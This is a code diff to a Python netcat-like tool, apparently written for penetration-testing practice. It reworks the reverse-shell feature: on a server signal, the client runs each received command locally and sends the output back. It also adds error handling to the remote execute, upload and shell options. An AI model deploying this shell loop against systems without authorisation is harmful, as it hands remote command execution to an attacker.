@@ -36,21 +36,6 @@ class CustomNetCat:
         else:
             self.send()
 
-    def client_reverse_shell_loop(self):
-        while True:
-            try:
-                request = self.receive_msg(self._sock)
-                if request.strip() == "exit":
-                    self._sock.close()
-                    sys.exit()
-                response = execute_command(request)
-                self.send_msg(self._sock, response)
-            except:
-                error = traceback.format_exc()
-                print(error)
-                self.send_msg(f'CLIENT ERROR:-\n{error}\n')
-
-
     def send(self):
         self._sock.connect((self.args.target, self.args.port))
         if self.buffer:
@@ -63,7 +48,9 @@ class CustomNetCat:
                     if response:
                         print(response)
                         if response == 'initiate_reverse_shell':
-                            self.client_reverse_shell_loop()
+                            self._spawn_shell(self._sock)
+                            self._sock.close()
+                            sys.exit()
                         msg = input('> ')
                         self.send_msg(self._sock, msg)
                 except EOFError:
@@ -87,21 +74,20 @@ class CustomNetCat:
             uploaded_file.write(file_buffer)
         msg = f'File {self.args.upload} uploaded successfully!'
         self.send_msg(sock, msg)
-
+            
     def _spawn_shell(self, sock):
-        try:
-            self.send_msg(sock, 'Shell > ')
-            while True:
+        while True:
+            try:
                 request = self.receive_msg(sock)
                 if request.strip() == 'exit':
                     break
                 result = execute_command(request)
-                self.send_msg(sock, f'{result}\nShell > ')
-        except:
-            error = traceback.format_exc()
-            print(error)
-            self._sock.close()
-            sys.exit()
+                self.send_msg(sock, result)
+            except:
+                error = traceback.format_exc()
+                print(error)
+                self.send_msg(sock, f'SHELL ERROR:-\n{error}\n')
+
 
     def _server_reverse_shell_loop(self, sock):
         self.send_msg(sock, 'initiate_reverse_shell')
@@ -126,14 +112,22 @@ class CustomNetCat:
 
     def handle(self, client_sock):
         if self.args.execute:
-            output = execute_command(self.args.execute)
+            try:
+                output = execute_command(self.args.execute)
+            except:
+                error = traceback.format_exc()
+                print(error)
+                output = f'REMOTE ERROR: {error}'
             self.send_msg(client_sock, output)
         
         elif self.args.upload:
             self._file_upload(client_sock)
 
         elif self.args.command:
+            self.send_msg(client_sock, 'Starting shell session...')
             self._spawn_shell(client_sock)
+            self._sock.close()
+            sys.exit()
 
         elif self.args.reverseshell:
             self._server_reverse_shell_loop(client_sock)
